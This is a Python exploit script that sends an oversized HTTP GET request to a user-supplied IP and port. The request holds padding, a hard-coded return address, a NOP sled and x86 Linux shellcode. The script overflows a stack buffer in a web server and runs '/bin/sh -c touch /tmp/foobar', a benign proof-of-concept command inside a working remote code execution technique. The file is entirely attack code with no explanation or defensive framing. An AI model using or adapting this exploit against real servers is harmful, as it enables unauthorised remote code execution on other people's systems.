#!/usr/bin/env python
# -*- coding:utf-8 -*-
import sys
import socket
 
def pwn(ip, port):
    junk = 'A'*139
    ret = "\x24\xfa\xff\xbf"
    nops = '\x90'*200
    shellcode  = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73"
    shellcode += "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x12\x00\x00"
    shellcode += "\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x66\x6f"
    shellcode += "\x6f\x62\x61\x72\x00\x57\x53\x89\xe1\xcd\x80"
    request = 'GET /' + junk + ret + ' HTTP/1.1' + nops + shellcode
 
    fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP)
    fd.connect((ip, port))
    fd.sendall(request)
    fd.close()
 
if __name__ == "__main__":
    if len(sys.argv) == 3:
        pwn(sys.argv[1], int(sys.argv[2]))
